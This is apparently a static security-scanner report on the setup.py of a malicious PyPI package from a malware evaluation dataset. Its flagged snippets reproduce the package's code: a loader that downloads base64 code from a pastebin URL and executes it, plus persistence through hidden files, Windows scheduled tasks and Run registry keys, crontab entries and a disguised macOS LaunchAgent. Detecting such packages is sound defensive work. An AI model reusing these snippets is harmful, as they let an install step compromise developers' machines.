Run started:2025-05-25 14:13:17.765720

Test results:
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:9
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
8	
9	macos_persist = '''<?xml version="1.0" encoding="UTF-8"?>
10	<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
11	<plist version="1.0">
12	<dict>
13	<key>Label</key>
14	<string>com.dortania.onecore.plist</string>
15	<key>ProgramArguments</key>
16	<array>
17	<string>''' + '/Users/' + os.getlogin() + '/.config/dconf/autostart/.update' + ''''</string>
18	</array>

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:24
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
23	
24	loader = '''
25	import urllib3,base64
26	url = 'https://pastebin.com/raw/VvkKsmxr'
27	http = urllib3.PoolManager()
28	resp = http.request('GET',url)
29	exec(base64.b64decode(resp.data.decode('utf-8')).decode('utf-8'))
30	'''
31	
32	win_mutex = '''

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:67
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
66	    write_package('C:\\ProgramData\\update.py')
67	    os.system('attrib +h C:\\ProgramData\\update.py')
68	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '):

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:67
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
66	    write_package('C:\\ProgramData\\update.py')
67	    os.system('attrib +h C:\\ProgramData\\update.py')
68	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '):

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:68
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
67	    os.system('attrib +h C:\\ProgramData\\update.py')
68	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '):
69	        os.system(r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PythonUpdate /t REG_SZ /d "{pythonpath} C:\ProgramData\update.py"')

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:68
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
67	    os.system('attrib +h C:\\ProgramData\\update.py')
68	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '):
69	        os.system(r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PythonUpdate /t REG_SZ /d "{pythonpath} C:\ProgramData\update.py"')

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:69
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
68	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '):
69	        os.system(r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PythonUpdate /t REG_SZ /d "{pythonpath} C:\ProgramData\update.py"')
70	

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:69
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
68	    if 0 != os.system(f'schtasks /create /tn PythonUpdate /tr "{pythonpath} C:\\ProgramData\\update.py" /sc HOURLY '):
69	        os.system(r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PythonUpdate /t REG_SZ /d "{pythonpath} C:\ProgramData\update.py"')
70	

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:82
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
81	    write_package(path)
82	    if os.system("echo '* */1 * * * " + pythonpath + " " + path + " ' | crontab -") != 0:
83	        try:

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:82
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
81	    write_package(path)
82	    if os.system("echo '* */1 * * * " + pythonpath + " " + path + " ' | crontab -") != 0:
83	        try:

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:87
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
86	                    with open('/var/spool/cron/crontabs/' + file,'a') as fd:
87	                        fd.write('* */1 * * * ' + pythonpath + ' ' + path)
88	                        break

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:93
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
92	            pass
93	    os.system(pythonpath + ' ' + path + ' 2>/dev/null &')        
94	

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:93
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
92	            pass
93	    os.system(pythonpath + ' ' + path + ' 2>/dev/null &')        
94	

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:104
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
103	    write_package(path)
104	    if os.system("echo '* */1 * * * " + pythonpath + " " + path + " ' | crontab -") != 0:
105	        try:

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:104
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
103	    write_package(path)
104	    if os.system("echo '* */1 * * * " + pythonpath + " " + path + " ' | crontab -") != 0:
105	        try:

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:107
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
106	            with open('/Library/LaunchAgents/com.dortania.onecore.plist','w') as fd:
107	                fd.write(macos_persist)
108	        except:

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:109
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
108	        except:
109	            os.system(pythonpath + ' ' + path + ' 2>/dev/null &')
110	        

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:109
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
108	        except:
109	            os.system(pythonpath + ' ' + path + ' 2>/dev/null &')
110	        

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:121
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
120	    write_package(path)
121	    os.system(pythonpath + ' ' + path + ' 2>/dev/null &')
122	

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:121
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
120	    write_package(path)
121	    os.system(pythonpath + ' ' + path + ' 2>/dev/null &')
122	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/package_test_index-999010119.1.0/package_test_index-999010119.1.0/setup.py:127
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
126	    with open(path,'w') as of:
127	        of.write(data)
128	

--------------------------------------------------

Code scanned:
	Total lines of code: 134
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 10.0
		High: 11.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 13.0
		High: 8.0
Files skipped (0):
